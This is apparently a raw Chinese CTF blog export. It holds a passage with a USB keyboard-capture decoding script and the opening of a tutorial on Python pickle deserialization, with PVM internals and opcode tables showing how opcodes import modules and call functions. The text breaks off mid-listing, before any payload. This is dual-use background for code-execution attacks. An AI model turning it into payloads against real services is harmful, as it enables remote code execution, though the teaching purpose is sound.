class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line">     <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line">      <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line">       <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line">        <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line">         <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line">          <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line">          <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后可能会将十六进制转换为字符串</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m=<span class="string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span></span><br><span class="line">s=<span class="built_in">bytes</span>.fromhex(m)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pickle反序列化</title>
      <link href="/2024/05/13/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/05/13/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="什么是Pickle"><a href="#什么是Pickle" class="headerlink" title="什么是Pickle"></a>什么是Pickle</h3><p><strong>pickle是Python中一个能够序列化和反序列化对象的模块</strong>。和其他语言类似，Python也提供了序列化和反序列化这一功能，其中一个实现模块就是pickle。在Python中，“Pickling” 是将 Python 对象及其所拥有的层次结构转化为一个二进制字节流的过程，也就是我们常说的序列化，而 <em>“unpickling”</em> 是相反的操作，会将字节流转化回一个对象层次结构。</p><p>当然在Python 中并不止pickle一个模块能够进行这一操作，更原始的序列化模块如<code>marshal</code>，同样能够完成序列化的任务，不过两者的侧重点并不相同，<code>marshal</code>存在主要是为了支持 Python 的<code>.pyc</code>文件。现在开发时一般首选pickle。</p><p>pickle实际上可以看作一种独立的语言，通过对<code>opcode</code>的编写可以进行Python代码执行、覆盖变量等操作。<strong>直接编写的<code>opcode</code>灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力</strong>）。</p><p>既然opcode能够执行Python代码，那自然就免不了安全问题。以下是Python在pickle文档中的警告。</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597d329e.png" alt="image-20240319204712798"></p><h3 id="pickle工作原理"><a href="#pickle工作原理" class="headerlink" title="pickle工作原理"></a>pickle工作原理</h3><p>python为我们提供了两个比较重要的库pickle 和 cpickle 后者 是底层使用c语言书写 速度是pickle 的1000倍 但是接口相同</p><p>其实pickle可以看作是一种独立的栈语言，它由一串串opcode（指令集）组成。该语言的解析是依靠Pickle Virtual Machine （PVM）进行的。</p><p>PVM由以下三部分组成：</p><blockquote><ul><li><p>指令处理器（引擎）</p><p>从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。最终留在栈顶的值将被作为反序列化对象返回。</p><p>从头开始读取流中的操作码和参数 并对其进行解释处理在这个过程中会改变栈区和标签区直到遇到.这个结束符后停止处理结束之后会到达栈顶形成并返回反序列化的对象</p></li><li><p>stack（栈区）</p><p>由 Python 的 list 实现，被用来临时存储数据、参数以及对象。</p><p>作为流数据处理过程中的暂存区在不断的进出过程中完成对数据流的反序列化并最终在栈上生成反序列化的结果 由python的list实现</p></li><li><p>memo</p><p>由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。</p><p>如同其名 是数据的一个索引 或者 标记 由python的dict实现为PVM整个生命周期提供存储</p></li></ul></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a597bd44b.png" alt="image-20240319210513560"></p><p>栈是一种存储数据的结构.栈有压栈和弹栈两种操作.</p><p>可以把栈看做一个弹夹,先进栈的数据后出栈,压栈就像压子弹,弹栈就像弹子弹.</p><p>当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。</p><blockquote><ul><li>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python。</li><li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li><li>v2 版协议是在 Python 2.3 中引入的。它为存储 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-new-style-class">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a href="https://www.python.org/dev/peps/pep-0307"><strong>PEP 307</strong></a>。</li><li>v3 版协议添加于 Python 3.0。它具有对 <a href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#bytes"><code>bytes</code></a> 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li><li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 <a href="https://www.python.org/dev/peps/pep-3154"><strong>PEP 3154</strong></a>。</li></ul></blockquote><p><strong>pickle协议是向前兼容的</strong> ，0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外</p><h2 id="pickle模块常见方法及接口"><a href="#pickle模块常见方法及接口" class="headerlink" title="pickle模块常见方法及接口"></a>pickle模块常见方法及接口</h2><blockquote><p>也就是pickle库中 序列化与反序列化的一些方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.dump(*obj*, *file*, *protocol=None*, ***, *fix_imports=True*)</span><br></pre></td></tr></table></figure><p>将打包好的对象 <em>obj</em> 写入文件中，其中protocol为pickling的协议版本（下同）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.dumps(*obj*, *protocol=None*, ***, *fix_imports=True*)</span><br></pre></td></tr></table></figure><p>将 <em>obj</em> 打包以后的对象作为bytes类型直接返回。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.load(*file*, ***, *fix_imports=True*, *encoding=&quot;ASCII&quot;*, *errors=&quot;strict&quot;*)</span><br></pre></td></tr></table></figure><p>从文件中读取二进制字节流，将其反序列化为一个对象并返回。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.loads(*data*, ***, *fix_imports=True*, *encoding=&quot;ASCII&quot;*, *errors=&quot;strict&quot;*)</span><br></pre></td></tr></table></figure><p>从data中读取二进制字节流，将其反序列化为一个对象并返回。</p></blockquote><p>obj：想要序列化的obj对象。<br>protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</p><p><strong>两个dump函数是把python对象转换为二进制对象（序列化）,两个load函数是把二进制对象转换为python对象（反序列化）</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.age=<span class="number">18</span></span><br><span class="line">        self.name=<span class="string">&quot;Pickle&quot;</span></span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"><span class="comment">#结果如下</span></span><br><span class="line"><span class="comment">#b&#x27;\x80\x04\x957\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x03age\x94K\x12\x8c\x04name\x94\x8c\x06Pickle\x94ub.&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">P=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The age is:&#x27;</span>+<span class="built_in">str</span>(P.age),<span class="string">&#x27;The name is:&#x27;</span>+P.name)</span><br><span class="line"><span class="comment">#结果如下</span></span><br><span class="line"><span class="comment">#The age is:18 The name is:Pickle</span></span><br></pre></td></tr></table></figure><p>如上述代码</p><p>这里我创建了一个Person类，其中有两个属性age和name。我首先使用了<code>pickle.dumps()</code>函数将一个Person对象序列化成二进制字节流的形式。然后使用<code>pickle.loads()</code>将一串二进制字节流反序列化为一个Person对象。</p><h2 id="能够序列化的对象"><a href="#能够序列化的对象" class="headerlink" title="能够序列化的对象"></a>能够序列化的对象</h2><ul><li><code>None</code>、<code>True</code> 和 <code>False</code></li><li>整数、浮点数、复数</li><li><code>str</code>、<code>byte</code>、<code>bytearray</code></li><li>只包含可打包对象的集合，包括 tuple、list、set 和 dict</li><li>定义在模块顶层的函数（使用 <a href="https://docs.python.org/zh-cn/3.7/reference/compound_stmts.html#def"><code>def</code></a> 定义，<a href="https://docs.python.org/zh-cn/3.7/reference/expressions.html#lambda"><code>lambda</code></a> 函数则不可以）</li><li>定义在模块顶层的内置函数</li><li>定义在模块顶层的类</li><li>某些类实例，这些类的 <a href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#object.__dict__"><code>__dict__</code></a> 属性值或 <a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#object.__getstate__"><code>__getstate__()</code></a> 函数的返回值可以被打包</li></ul><p>对于不能序列化的类型，如lambda函数，使用pickle模块时则会抛出 <a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle.PicklingError"><code>PicklingError</code></a> 异常</p><h2 id="常用opcode"><a href="#常用opcode" class="headerlink" title="常用opcode"></a>常用opcode</h2><p>在Python的pickle.py中，我们能够找到所有的opcode及其解释，常用的opcode如下，这里我们以V0版本为例</p><table><thead><tr><th align="left">指令</th><th align="left">描述</th><th align="left">具体写法</th><th align="left">栈上的变化</th></tr></thead><tbody><tr><td align="left">c</td><td align="left">获取一个全局对象或import一个模块</td><td align="left">c[module]\n[instance]\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">o</td><td align="left">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td align="left">o</td><td align="left">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td></tr><tr><td align="left">i</td><td align="left">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td align="left">i[module]\n[callable]\n</td><td align="left">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td></tr><tr><td align="left">N</td><td align="left">实例化一个None</td><td align="left">N</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">S</td><td align="left">实例化一个字符串对象</td><td align="left">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">V</td><td align="left">实例化一个UNICODE字符串对象</td><td align="left">Vxxx\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">I</td><td align="left">实例化一个int对象</td><td align="left">Ixxx\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">F</td><td align="left">实例化一个float对象</td><td align="left">Fx.x\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">R</td><td align="left">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td align="left">R</td><td align="left">函数和参数出栈，函数的返回值入栈</td></tr><tr><td align="left">.</td><td align="left">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td align="left">.</td><td align="left">无</td></tr><tr><td align="left">(</td><td align="left">向栈中压入一个MARK标记</td><td align="left">(</td><td align="left">MARK标记入栈</td></tr><tr><td align="left">t</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为元组</td><td align="left">t</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">)</td><td align="left">向栈中直接压入一个空元组</td><td align="left">)</td><td align="left">空元组入栈</td></tr><tr><td align="left">l</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为列表</td><td align="left">l</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">]</td><td align="left">向栈中直接压入一个空列表</td><td align="left">]</td><td align="left">空列表入栈</td></tr><tr><td align="left">d</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td align="left">d</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">}</td><td align="left">向栈中直接压入一个空字典</td><td align="left">}</td><td align="left">空字典入栈</td></tr><tr><td align="left">p</td><td align="left">将栈顶对象储存至memo_n</td><td align="left">pn\n</td><td align="left">无</td></tr><tr><td align="left">g</td><td align="left">将memo_n的对象压栈</td><td align="left">gn\n</td><td align="left">对象被压栈</td></tr><tr><td align="left">0</td><td align="left">丢弃栈顶对象</td><td align="left">0</td><td align="left">栈顶对象被丢弃</td></tr><tr><td align="left">b</td><td align="left">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td align="left">b</td><td align="left">栈上第一个元素出栈</td></tr><tr><td align="left">s</td><td align="left">将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td align="left">s</td><td align="left">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td></tr><tr><td align="left">u</td><td align="left">寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td align="left">u</td><td align="left">MARK标记以及被组合的数据出栈，字典被更新</td></tr><tr><td align="left">a</td><td align="left">将栈的第一个元素append到第二个元素(列表)中</td><td align="left">a</td><td align="left">栈顶元素出栈，第二个元素（列表）被更新</td></tr><tr><td align="left">e</td><td align="left">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td align="left">e</td><td align="left">MARK标记以及被组合的数据出栈，列表被更新</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MARK           = b&#x27;(&#x27;   # push special markobject on stack</span><br><span class="line">STOP           = b&#x27;.&#x27;   # every pickle ends with STOP</span><br><span class="line">POP            = b&#x27;0&#x27;   # discard topmost stack item</span><br><span class="line">POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject</span><br><span class="line">DUP            = b&#x27;2&#x27;   # duplicate top stack item</span><br><span class="line">FLOAT          = b&#x27;F&#x27;   # push float object; decimal string argument</span><br><span class="line">INT            = b&#x27;I&#x27;   # push integer or bool; decimal string argument</span><br><span class="line">BININT         = b&#x27;J&#x27;   # push four-byte signed int</span><br><span class="line">BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int</span><br><span class="line">LONG           = b&#x27;L&#x27;   # push long; decimal string argument</span><br><span class="line">BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int</span><br><span class="line">NONE           = b&#x27;N&#x27;   # push None</span><br><span class="line">PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg</span><br><span class="line">BINPERSID      = b&#x27;Q&#x27;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span><br><span class="line">REDUCE         = b&#x27;R&#x27;   # apply callable to argtuple, both on stack</span><br><span class="line">STRING         = b&#x27;S&#x27;   # push string; NL-terminated string argument</span><br><span class="line">BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument</span><br><span class="line">SHORT_BINSTRING= b&#x27;U&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &amp;lt; 256 bytes</span><br><span class="line">UNICODE        = b&#x27;V&#x27;   # push Unicode string; raw-unicode-escaped&#x27;d argument</span><br><span class="line">BINUNICODE     = b&#x27;X&#x27;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span><br><span class="line">APPEND         = b&#x27;a&#x27;   # append stack top to list below it</span><br><span class="line">BUILD          = b&#x27;b&#x27;   # call __setstate__ or __dict__.update()</span><br><span class="line">GLOBAL         = b&#x27;c&#x27;   # push self.find_class(modname, name); 2 string args</span><br><span class="line">DICT           = b&#x27;d&#x27;   # build a dict from stack items</span><br><span class="line">EMPTY_DICT     = b&#x27;&#125;&#x27;   # push empty dict</span><br><span class="line">APPENDS        = b&#x27;e&#x27;   # extend list on stack by topmost stack slice</span><br><span class="line">GET            = b&#x27;g&#x27;   # push item from memo on stack; index is string arg</span><br><span class="line">BINGET         = b&#x27;h&#x27;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span><br><span class="line">INST           = b&#x27;i&#x27;   # build &amp;amp; push class instance</span><br><span class="line">LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg</span><br><span class="line">LIST           = b&#x27;l&#x27;   # build list from topmost stack items</span><br><span class="line">EMPTY_LIST     = b&#x27;]&#x27;   # push empty list</span><br><span class="line">OBJ            = b&#x27;o&#x27;   # build &amp;amp; push class instance</span><br><span class="line">PUT            = b&#x27;p&#x27;   # store stack top in memo; index is string arg</span><br><span class="line">BINPUT         = b&#x27;q&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br><span class="line">LONG_BINPUT    = b&#x27;r&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span><br><span class="line">SETITEM        = b&#x27;s&#x27;   # add key+value pair to dict</span><br><span class="line">TUPLE          = b&#x27;t&#x27;   # build tuple from topmost stack items</span><br><span class="line">EMPTY_TUPLE    = b&#x27;)&#x27;   # push empty tuple</span><br><span class="line">SETITEMS       = b&#x27;u&#x27;   # modify dict by adding topmost key+value pairs</span><br><span class="line">BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding</span><br><span class="line"></span><br><span class="line">TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br><span class="line">FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br><span class="line"></span><br><span class="line"># Protocol 2</span><br><span class="line"></span><br><span class="line">PROTO          = b&#x27;\x80&#x27;  # identify pickle protocol</span><br><span class="line">NEWOBJ         = b&#x27;\x81&#x27;  # build object by applying cls.__new__ to argtuple</span><br><span class="line">EXT1           = b&#x27;\x82&#x27;  # push object from extension registry; 1-byte index</span><br><span class="line">EXT2           = b&#x27;\x83&#x27;  # ditto, but 2-byte index</span><br><span class="line">EXT4           = b&#x27;\x84&#x27;  # ditto, but 4-byte index</span><br><span class="line">TUPLE1         = b&#x27;\x85&#x27;  # build 1-tuple from stack top</span><br><span class="line">TUPLE2         = b&#x27;\x86&#x27;  # build 2-tuple from two topmost stack items</span><br><span class="line">TUPLE3         = b&#x27;\x87&#x27;  # build 3-tuple from three topmost stack items</span><br><span class="line">NEWTRUE        = b&#x27;\x88&#x27;  # push True</span><br><span class="line">NEWFALSE       = b&#x27;\x89&#x27;  # push False</span><br><span class="line">LONG1          = b&#x27;\x8a&#x27;  # push long from &amp;lt; 256 bytes</span><br><span class="line">LONG4          = b&#x27;\x8b&#x27;  # push really big long</span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</span><br><span class="line"></span><br><span class="line"># Protocol 3 (Python 3.x)</span><br><span class="line"></span><br><span class="line">BINBYTES       = b&#x27;B&#x27;   # push bytes; counted binary string argument</span><br><span class="line">SHORT_BINBYTES = b&#x27;C&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &amp;lt; 256 bytes</span><br><span class="line"></span><br><span class="line"># Protocol 4</span><br><span class="line"></span><br><span class="line">SHORT_BINUNICODE = b&#x27;\x8c&#x27;  # push short string; UTF-8 length &amp;lt; 256 bytes</span><br><span class="line">BINUNICODE8      = b&#x27;\x8d&#x27;  # push very long string</span><br><span class="line">BINBYTES8        = b&#x27;\x8e&#x27;  # push very long bytes string</span><br><span class="line">EMPTY_SET        = b&#x27;\x8f&#x27;  # push empty set on the stack</span><br><span class="line">ADDITEMS         = b&#x27;\x90&#x27;  # modify set by adding topmost stack items</span><br><span class="line">FROZENSET        = b&#x27;\x91&#x27;  # build frozenset from topmost stack items</span><br><span class="line">NEWOBJ_EX        = b&#x27;\x92&#x27;  # like NEWOBJ but work with keyword only arguments</span><br><span class="line">STACK_GLOBAL     = 